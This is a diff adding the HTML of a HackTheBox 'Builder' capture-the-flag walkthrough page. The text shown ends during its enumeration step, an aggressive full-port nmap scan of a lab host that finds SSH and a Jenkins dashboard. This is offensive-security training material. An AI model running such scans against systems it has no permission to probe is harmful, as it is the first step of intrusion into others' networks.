@@ -1,0 +1,1165 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups for infosec and dev stuff that I'm doing.">
+      
+      
+      
+        <link rel="canonical" href="https://krovs.github.io/writeups/builder/">
+      
+      
+        <link rel="prev" href="../mailing/">
+      
+      
+        <link rel="next" href="../access/">
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../assets/favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Builder - Krovs' Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#builder" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Krovs&#39; Writeups" class="md-header__button md-logo" aria-label="Krovs' Writeups" data-md-component="logo">
+      
+  <img src="../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Krovs' Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Builder
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="amber"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="pink"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/krovs/writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Krovs&#39; Writeups" class="md-nav__button md-logo" aria-label="Krovs' Writeups" data-md-component="logo">
+      
+  <img src="../assets/logo.png" alt="logo">
+
+    </a>
+    Krovs' Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/krovs/writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../archive/2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/active-directory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/proving-grounds/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proving Grounds
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/tryhackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href=".." class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2025-05-14 00:00:00+00:00" class="md-ellipsis">May 14, 2025</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../category/hackthebox/">HackTheBox</a>, 
+                              <a href="../category/linux/">Linux</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              7 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">HackTheBox</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Linux</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">🐧 Linux</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">📦 HackTheBox</span>
+      
+    
+  </nav>
+
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/krovs/writeups/raw/master/docs/posts/HackTheBox/Linux/builder.md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="builder">Builder</h1>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250514234815.png" /></p>
+<!-- more -->
+
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-T4<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-p-<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>--open<span class="w"> </span><span class="m">10</span>.10.11.10
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-05-14<span class="w"> </span><span class="m">23</span>:57<span class="w"> </span>CEST
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.10
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.041s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65533</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.9p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu0.6<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">64</span>:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Jetty<span class="w"> </span><span class="m">10</span>.0.18
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry<span class="w"> </span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">|</span>_/
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">|</span><span class="w"> </span>http-open-proxy:<span class="w"> </span>Potentially<span class="w"> </span>OPEN<span class="w"> </span>proxy.
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="p">|</span>_Methods<span class="w"> </span>supported:CONNECTION
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">|</span>_http-title:<span class="w"> </span>Dashboard<span class="w"> </span><span class="o">[</span>Jenkins<span class="o">]</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Jetty<span class="o">(</span><span class="m">10</span>.0.18<span class="o">)</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.0<span class="w"> </span><span class="o">(</span><span class="m">98</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.0<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.14<span class="w"> </span><span class="o">(</span><span class="m">98</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">4</span>.15<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.19<span class="w"> </span><span class="o">(</span><span class="m">94</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="w"> </span>-<span class="w"> </span><span class="m">3</span>.13<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>OpenWrt<span class="w"> </span><span class="m">22</span>.03<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">5</span>.10<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">92</span>%<span class="o">)</span>,<span class="w"> </span>MikroTik<span class="w"> </span>RouterOS<span class="w"> </span><span class="m">7</span>.2<span class="w"> </span>-<span class="w"> </span><span class="m">7</span>.5<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">5</span>.6.3<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">92</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.10<span class="w"> 